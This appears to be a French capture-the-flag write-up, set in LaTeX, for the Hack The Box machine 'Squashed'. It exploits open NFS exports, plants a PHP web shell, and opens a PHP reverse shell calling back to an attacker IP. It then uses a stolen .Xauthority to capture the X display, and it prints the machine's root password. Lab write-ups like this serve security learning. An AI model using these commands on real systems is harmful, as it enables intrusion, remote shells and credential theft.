\chapter{squashed}
\begin{itemize}
    \item {\bf technics}: NFS, X11 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.191
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Built Better
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33771/tcp   mountd
|   100005  1,2,3      45533/tcp6  mountd
|   100005  1,2,3      56444/udp6  mountd
|   100005  1,2,3      57774/udp   mountd
|   100021  1,3,4      33953/tcp   nlockmgr
|   100021  1,3,4      40615/tcp6  nlockmgr
|   100021  1,3,4      52149/udp6  nlockmgr
|   100021  1,3,4      52902/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
33771/tcp open  mountd   1-3 (RPC #100005)
33953/tcp open  nlockmgr 1-4 (RPC #100021)
38281/tcp open  mountd   1-3 (RPC #100005)
51445/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

\end{verbatim}


\subsection{NFS}
\begin{verbatim}
         showmount        showstat4        showwal
benmusashi@honbu:~/documents/pentesting-games/htb/squashed$ showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *

$ sudo mount -t nfs 10.10.11.191:/home/ross ross -nolock
$ sudo mount -t nfs 10.10.11.191:/var/www/html html -nolock

-rw-rw-r--  1 1001 dotdotpwn 1365 Oct 19 14:57 Passwords.kdbx

-rw-------  1       1001 dotdotpwn    57 Jan 18 04:35 .Xauthority
-rw-------  1       1001 dotdotpwn  2475 Jan 18 04:35 .xsession-errors
-rw-------  1       1001 dotdotpwn  2475 Dec 27 16:33 .xsession-errors.old


$ keepass2john Passwords.kdbx
! Passwords.kdbx : File version '40000' is currently not supported!
\end{verbatim}

en realisant un NFS imitation on peut récup le \verb+.Xauthority+


\begin{verbatim}
[dummy@honbu mnt]$ ls -l
total 44
drwxr-xr-x 2 dummy http  4096 Jan 18 05:45 css
drwxr-xr-x 2 dummy http  4096 Jan 18 05:45 images
-rw-r----- 1 dummy http 32532 Jan 18 05:45 index.html
drwxr-xr-x 2 dummy http  4096 Jan 18 05:45 js
[dummy@honbu mnt]$ id
uid=2017(dummy) gid=1002(dummy) groups=1002(dummy)
[dummy@honbu mnt]$ pwd
/mnt
\end{verbatim}

on peut alors creer un webshell en php.
\begin{verbatim}

$  echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' > webshell.php

$ curl http://10.10.11.191/webshell.php?cmd=id
uid=2017(alex) gid=2017(alex) groups=2017(alex)
\end{verbatim}

en esssayant un revershell avec system la connexion coupe directement après la
connexion.

donc on passe par \verb+proc_open+

\begin{verbatim}
$ cat rev.php
<?php
        $sock=fsockopen("10.10.16.6",4444);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
\end{verbatim}


\section{Foothold}

\subsection{Alex}

on confirme que ross est connecté
\begin{verbatim}
$ who
ross     tty7         Jan 18 03:35 (:0)
$ w
 05:55:03 up  2:19,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               03:35    2:19m 13.83s  0.07s /usr/libexec/gnome-session-binary --systemd --session=gnome
\end{verbatim}


on récup le .Xauthority qu'on a récupéré

\begin{verbatim}
$ python -m http.server 4445
Serving HTTP on 0.0.0.0 port 4445 (http://0.0.0.0:4445/) ...
10.10.11.191 - - [18/Jan/2023 06:52:56] "GET /.Xauthority HTTP/1.1" 200 -
\end{verbatim}



\begin{verbatim}
$ export XAUTHORITY=./.Xauthority
$ xwd -root -screen -silent -display :0 > /tmp/screen.xwd
$ cp /tmp/screen.xwd /var/www/html
$ wget http://10.10.11.191/screen.xwd
$ convert screen.xwd screen.png
\end{verbatim}

on a le password de root
\begin{verbatim}
cah$mei7rai9A
\end{verbatim}
